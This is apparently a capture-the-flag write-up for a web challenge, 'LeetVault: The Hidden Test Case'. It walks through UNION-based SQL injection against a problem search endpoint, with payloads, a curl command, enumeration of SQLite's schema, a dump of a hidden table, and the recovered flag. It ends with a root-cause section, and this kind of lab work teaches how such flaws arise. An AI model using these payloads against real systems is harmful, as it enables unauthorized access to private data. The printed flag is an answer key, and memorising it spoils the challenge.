---
title: "LeetVault: The Hidden Test Case"
description: "The challenge page identifies the target as the legacy problem search. The Problems page shows that searches are sent to:"
event: "isfcr"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CTF 2026","web"]
date: "2026-10-10"
teammate: false
source: "isfcr/writeups/the-hidden-test-case.md"
---

## Discovery

The challenge page identifies the target as the legacy problem search. The
Problems page shows that searches are sent to:

```text
GET /api/problems?search=<query>
```

A normal request returns six public problems. Supplying a single quote causes
a SQL error, indicating that the search value is inserted into a database
query without adequate parameterization.

## Confirming SQL Injection

The following UNION payload adds a synthetic result:

```text
' UNION SELECT 1,'x','y','z' -- 
```

Using curl:

```bash
curl -sS --get --data-urlencode \
  "search=' UNION SELECT 1,'x','y','z' -- " \
  "https://isfcrpesu-hidden-test-case.chals.io/api/problems"
```

The response includes a result with `id: 1`, `title: "x"`,
`difficulty: "y"`, and `category: "z"`, confirming a four-column UNION
injection. The selected columns are ordered as:

```text
id, title, difficulty, category
```

## Enumerating the Database

SQLite exposes its schema through `sqlite_master`. Querying it through the
injection reveals an `internal_notes` table:

```text
' UNION SELECT 0,name,sql,'x'
  FROM sqlite_master
  WHERE type='table' -- 
```

The table schema is:

```sql
CREATE TABLE internal_notes (
    id INTEGER PRIMARY KEY,
    note_type TEXT NOT NULL,
    content TEXT NOT NULL,
    created_at TEXT NOT NULL
)
```

## Recovering the Flag

Selecting the internal notes exposes the hidden verification value:

```text
' UNION SELECT id,note_type,content,created_at
  FROM internal_notes -- 
```

The `legacy_migration` record contains:

```text
Migration verification complete. Hidden test case: isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}
```

## Flag

```text
isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}
```

## Root Cause

The legacy search endpoint constructs SQL using the user-supplied search
string instead of a parameterized query. This permits UNION-based SQL
injection and allows records outside the public problem list to be read.
